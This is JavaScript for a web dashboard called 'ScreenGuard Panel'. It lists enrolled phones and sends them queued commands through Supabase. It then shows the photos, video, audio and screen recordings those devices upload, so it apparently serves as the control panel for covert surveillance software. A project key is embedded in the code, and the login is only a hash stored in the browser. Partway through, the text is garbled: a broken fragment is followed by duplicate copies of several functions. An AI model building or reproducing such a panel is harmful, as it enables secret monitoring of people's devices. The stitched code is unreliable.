// ============================================
// SCREENGUARD PANEL
// ============================================

// ⭐ STEP 1: YAHAN APNI SUPABASE VALUES DAAL
const SUPABASE_URL = "https://weyfoshcpyqjbcmpxrqq.supabase.co";
const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndleWZvc2hjcHlxamJjbXB4cnFxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTEyODIzNDEsImV4cCI6MjEwNjg1ODM0MX0.0ur5-MQdbtbZdG9Q7CzHAhzMv5Z7unXGti3fuz6vk0U";

// ============================================

let supabase = null;
let currentDeviceKey = null;

const SESSION_KEY = 'screenguard_session';
const PASSWORD_HASH_KEY = 'screenguard_pass_hash';
const SESSION_EXPIRY = 7 * 24 * 60 * 60 * 1000;

// INIT
document.addEventListener('DOMContentLoaded', () => {
    console.log('[Panel] Loading...');

    // Supabase init
    try {
        supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
        console.log('[Panel] Supabase connected');
    } catch (e) {
        console.error('[Panel] Supabase init failed:', e);
        document.getElementById('loginError').textContent = 'Supabase config error';
        return;
    }

    // Check session
    if (isLoggedIn()) {
        showDashboard();
    } else {
        showLogin();
    }

    // Form
    document.getElementById('loginForm').addEventListener('submit', handleLogin);
    document.getElementById('logoutBtn').addEventListener('click', handleLogout);
    document.getElementById('refreshBtn').addEventListener('click', () => location.reload());
    document.getElementById('refreshMediaBtn').addEventListener('click', loadMedia);

    // Actions
    document.querySelectorAll('.action-btn[data-cmd]').forEach(btn => {
        btn.addEventListener('click', () => sendCommand(btn, btn.dataset.cmd));
    });
});

// AUTH
async function handleLogin(e) {
    e.preventDefault();

    const password = document.getElementById('passwordInput').value.trim();
    if (!password) return;

    const btn = document.getElementById('loginBtn');
    const error = document.getElementById('loginError');

    btn.disabled = true;
    btn.textContent = 'Signing in...';
    error.textContent = '';

    try {
        const hash = await sha256(password);
        const storedHash = localStorage.getItem(PASSWORD_HASH_KEY);

        if (!storedHash) {
            localStorage.setItem(PASSWORD_HASH_KEY, hash);
            saveSession();
            showDashboard();
            toast('Password set! Welcome.', 'success');
            return;
        }

        if (hash === storedHash) {
            saveSession();
            showDashboard();
            toast('Welcome back!', 'success');
        } else {
            error.textContent = 'Galat password';
            btn.disabled = false;
            btn.textContent = 'Sign In';
            document.getElementById('passwordInput').value = '';
        }
    } catch (e) {
        console.error('[Auth]', e);
        error.textContent = 'Error: ' + e.message;
        btn.disabled = false;
        btn.textContent = 'Sign In';
    }
}

function handleLogout() {
    if (!confirm('Logout?')) return;
    localStorage.removeItem(SESSION_KEY);
    location.reload();
}

function isLoggedIn() {
    try {
        const s = JSON.parse(localStorage.getItem(SESSION_KEY) || 'null');
        if (!s) return false;
        if (Date.now() > s.expiry) { localStorage.removeItem(SESSION_KEY); return false; }
        return true;
    } catch { return false; }
}

function saveSession() {
    localStorage.setItem(SESSION_KEY, JSON.stringify({ expiry: Date.now() + SESSION_EXPIRY }));
}

async function sha256(text) {
    const buf = new TextEncoder().encode(text);
    const hash = await crypto.subtle.digest('SHA-256', buf);
    return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
}

// SCREENS
function showLogin() {
    document.getElementById('loginScreen').classList.remove('hidden');
    document.getElementById('dashboard').classList.add('hidden');
    setTimeout(() => document.getElementById('passwordInput').focus(), 100);
}

function showDashboard() {
    document.getElementById('loginScreen').classList.add('hidden');
    document.getElementById('dashboard').classList.remove('hidden');
    loadDevices();
}

// DEVICES
async function loadDevices() {
    const list = document.getElementById('devicesList');
    list.innerHTML = '<div class="loading">Loading devices…</div>';

    try {
        const { data, error } = await supabase
            .from('devices')
            .select('*')
            .order('last_seen', { ascending: false });

        if (error) throw error;

        if (!data || data.length === 0) {
            list.innerHTML = '<div class="empty">📭 Koi device nahi<br><small>App install karke setup karo</small></div>';
            return;
        }

        list.innerHTML = data.map(d => {
            const isOnline = d.last_seen && (Date.now() - new Date(d.last_seen).getTime() < 5 * 60 * 1000);
            const name = `${d.brand || ''} ${d.model || ''}`.trim() || d.device_key.substring(0, 8);
            const battery = d.battery_level >= 0 ? `${d.battery_level}%` : '—';

            return `
                <div class="device-card ${currentDeviceKey === d.device_key ? 'active' : ''}" data-key="${d.device_key}">
                    <div class="device-name">
                        <span class="status-dot ${isOnline ? 'online' : 'offline'}"></span>
                        ${escapeHtml(name)}
                    </div>
                    <div class="device-meta">
                        <span>🔋 ${battery}</span>
                        <span>${timeAgo(d.last_seen)}</span>
                    </div>
                </div>
            `;
        }).join('');

        list.querySelectorAll('.device-card').forEach(card => {
            card.addEventListener('click', () => selectDevice(card.dataset.key, data));
        });

        if (data.length === 1 && !currentDeviceKey) {
            selectDevice(data[0].device_key, data);
        }
    } catch (e) {
        console.error('[Devices]', e);
        list.innerHTML = '<div class="empty">❌ ' + e.message + '</div>';
    }
}

function selectDevice(key, devices) {
    currentDeviceKey = key;
    document.querySelectorAll('.device-card').forEach(c => {
        c.classList.toggle('active', c.dataset.key === key);
    });

    const device = devices.find(d => d.device_key === key);
    if (!device) return;

    document.getElementById('actionsSection').classList.remove('hidden');
    const name = `${device.brand || ''} ${device.model || ''}`.trim() || device.device_key.substring(0, 8);
    document.getElementById('selectedName').textContent = name;

    const isOnline = device.last_seen && (Date.now() - new Date(device.last_seen).getTime() < 5 * 60 * 1000);
    const statusEl = document.getElementById('selectedStatus');
    statusEl.textContent = isOnline ? '🟢 Online' : '🔴 Offline';
    statusEl.className = 'status-badge ' + (isOnline ? 'online' : 'offline');

    document.getElementById('batteryText').textContent = device.battery_level >= 0 ? `${device.battery_level}%` : '—';
    document.getElementById('lastSeenText').textContent = timeAgo(device.last_seen);

    loadMedia();
}

// COMMANDS
async function sendCommand(btn, cmd) {
    if (!currentDeviceKey) {
        toast('Pehle device select karo', 'error');
        return;
    }

    if (btn) {
        btn.disabled = true;
        setTimeout(() => btn.disabled = false, 1500);
    }

    try {
        const { error } = await supabase
            .from('commands')
            .insert({
                device_key: currentDeviceKey,
                cmd: cmd,
                status: 'pending'
            });

        if (error) throw error;
        toast(`✓ ${cmd} bheja gaya`, 'success');
    } catch (e) {
        console.error('[Command]', e);
        toast('Command fail: ' + e.message, 'error');
    }
}

function sendCustom(type) {
    const d = parseInt(document.getElementById('customDuration').value) || 30;
    sendCommand(null, `${type}:${d}`);
}

// MEDIA
async function loadMedia() {
    const list = document.getElementById('mediaList');
    if (!currentDeviceKey) return;

    list.innerHTML = '<div class="loading">Loading media…</div>';

    try {
        const { data, error } = await supabase
            .from('media')
            .select('*')
            .eq('device_key', currentDeviceKey)
            .order('created_at', { ascending: false })
            .limit(20);

        if (error) throw error;

        if (!data || data.length === 0) {
            list.innerHTML = '<div class="empty">Koi media nahi</div>';
            return;
        }

        list.innerHTML = data.map(m => {
            const url = m.public_url || '';
            const type = m.media_type || 'photo';
            let icon = '📄';
            if (type === 'photo') icon = '📸';
            else if (type === 'video') icon = '🎥';
            else if (type === 'audio') icon = '🎤';
            else if (type === 'screen') icon = '📹';

            return `
                <div class="media-item" data-url="${escapeHtml(url)}" data-type="${type}">
                    <div class="media-icon">${icon}</div>
                    <img src="${escapeHtml(url)}" loading="lazy" onerror="this.style.display='none'">
                    <div class="media-item-label">
                        <span>${type}</span>
                        <span>${timeAgo(m.created_at)}</span>
                    </div>
                </div>
            `;
        }).join('');

        list.querySelectorAll('.media-item').forEach(item => {
            item.addEventListener('click', () => window.open(item.dataset.url, '_blank'));
        });
    } catch (e) {
        console.error('[Media]', e);
        list.innerHTML = '<div class="empty">❌ ' + e.message + '</div>';
    }
}

// HELPERS
function timeAgo(ts) {
    if (!ts) return '—';
    const diff = Date.now() - new Date(ts).getTime();
    if (diff < 60000) return 'Just now';
    if (diff < 3600000) return Math.floor(diff / 60000) + 'm ago';
    if (diff < 86400000) return Math.floor(diff / 3600000) + 'h ago';
    return Math.floor(diff / 86400000) + 'd ago';
}

function escapeHtml(str) {
    if (!str) return '';
    return String(str).replace(/[&<>"']/g, c => ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;',
        '"': '&quot;', "'": '&#39;'
    }[c]));
}

function toast(msg, type = 'info') {
    const el = document.getElementById('toast');
    el.textContent = msg;
    el.className = 'toast ' + type;
    el.classList.remove('hidden');
    clearTimeout(window._toastTimer);
    window._toastTimer = setTimeout(() => el.classList.add('hidden'), 2500);
}[Command] Error:', e);
        toast('Command fail: ' + e.message, 'error');
    }
}

function sendCustom(type) {
    const duration = parseInt(document.getElementById('customDuration').value) || 30;
    const cmd = `${type}:${duration}`;
    sendCommand(null, cmd);
}

// ============================================
// MEDIA
// ============================================

async function loadMedia() {
    const list = document.getElementById('mediaList');
    if (!currentDeviceKey) return;

    list.innerHTML = '<div class="loading">Loading media…</div>';

    try {
        const { data, error } = await supabase
            .from('media')
            .select('*')
            .eq('device_key', currentDeviceKey)
            .order('created_at', { ascending: false })
            .limit(20);

        if (error) throw error;

        if (!data || data.length === 0) {
            list.innerHTML = '<div class="empty">Koi media nahi</div>';
            return;
        }

        list.innerHTML = data.map(m => {
            const url = m.public_url || '';
            const time = timeAgo(m.created_at);
            const type = m.media_type || 'photo';

            let icon = '📄';
            if (type === 'photo') icon = '📸';
            else if (type === 'video') icon = '🎥';
            else if (type === 'audio') icon = '🎤';
            else if (type === 'screen') icon = '📹';

            return `
                <div class="media-item" data-url="${escapeHtml(url)}" data-type="${type}">
                    <div class="media-icon">${icon}</div>
                    <img src="${escapeHtml(url)}" loading="lazy" onerror="this.style.display='none'">
                    <div class="media-item-label">
                        <span>${type}</span>
                        <span>${time}</span>
                    </div>
                </div>
            `;
        }).join('');

        // Click handlers
        list.querySelectorAll('.media-item').forEach(item => {
            item.addEventListener('click', () => openMedia(item.dataset.url, item.dataset.type));
        });

    } catch (e) {
        console.error('[Media] Load failed:', e);
        list.innerHTML = '<div class="empty">❌ ' + e.message + '</div>';
    }
}

function openMedia(url, type) {
    const overlay = document.createElement('div');
    overlay.className = 'modal-overlay';

    let content = '';
    if (type === 'photo' || type === 'screen') {
        content = `<img src="${escapeHtml(url)}">`;
    } else if (type === 'video') {
        content = `<video src="${escapeHtml(url)}" controls autoplay></video>`;
    } else if (type === 'audio') {
        content = `<audio src="${escapeHtml(url)}" controls autoplay style="width:300px"></audio>`;
    }

    overlay.innerHTML = `
        <div class="modal-content">
            <button class="modal-close">✕</button>
            ${content}
        </div>
    `;

    overlay.addEventListener('click', (e) => {
        if (e.target === overlay || e.target.classList.contains('modal-close')) {
            document.body.removeChild(overlay);
        }
    });

    document.body.appendChild(overlay);
}

// ============================================
// HELPERS
// ============================================

function timeAgo(timestamp) {
    if (!timestamp) return '—';
    const diff = Date.now() - new Date(timestamp).getTime();
    if (diff < 60_000) return 'Just now';
    if (diff < 3_600_000) return Math.floor(diff / 60_000) + 'm ago';
    if (diff < 86_400_000) return Math.floor(diff / 3_600_000) + 'h ago';
    return Math.floor(diff / 86_400_000) + 'd ago';
}

function escapeHtml(str) {
    if (!str) return '';
    return String(str).replace(/[&<>"']/g, c => ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;',
        '"': '&quot;', "'": '&#39;'
    }[c]));
}

function toast(msg, type = 'info') {
    const el = document.getElementById('toast');
    el.textContent = msg;
    el.className = 'toast ' + type;
    el.classList.remove('hidden');

    clearTimeout(window._toastTimer);
    window._toastTimer = setTimeout(() => {
        el.classList.add('hidden');
    }, 2500);
}
